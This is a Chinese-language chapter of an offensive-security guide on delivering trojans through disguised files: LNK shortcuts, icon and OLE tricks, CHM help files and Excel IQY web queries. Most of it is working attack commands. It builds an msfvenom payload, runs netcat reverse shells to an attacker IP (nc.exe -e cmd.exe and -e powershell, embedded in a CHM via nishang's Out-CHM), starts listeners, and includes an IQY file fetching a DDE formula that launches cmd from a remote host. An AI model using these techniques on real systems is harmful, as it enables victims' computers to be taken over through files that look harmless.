# 木马投递

## 恶意软件伪装

### 文件伪装

1.快捷方式伪装

(1)

[lnk.ps1](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/lnk.ps1)

(2)

[ico.ps1](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/ico.ps1)

[download.ps1](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/download.ps1)

hi.exe:

```bash
msfvenom -p windows/x64/messagebox TEXT='There is payload!' TITLE='Ghost Wolf Lab' -f exe > hi.exe
```

(3)

[ole.ps1](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/ole.ps1)

nc.cmd:

```bash
C:\Users\Administrator\Desktop\nc.exe IP地址 4444 -e cmd.exe  
//嵌入攻击者主机IP地址
```

2.CHM文件

[nc.html](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AB%E7%AB%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BC%AA%E8%A3%85/nc.html)

```bash
nc -lvp 4444
```

nishang:

```bash
Import-Module .\Out-CHM.ps1
out-chm -payload "C:\Users\Administrator\Desktop\nc.exe -e powershell IP地址 5555" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
nc -lvp 5555
```

3.IQY文件

test.iqy:

```iqy
WEB
1
https://www.baidu.com/robots.txt
```

calc.dat:

```bash
=cmd|' /C calc'!notthissheet
```

calc.iqy:

```bash
WEB
1
http://IP地址/payload/calc.dat
```
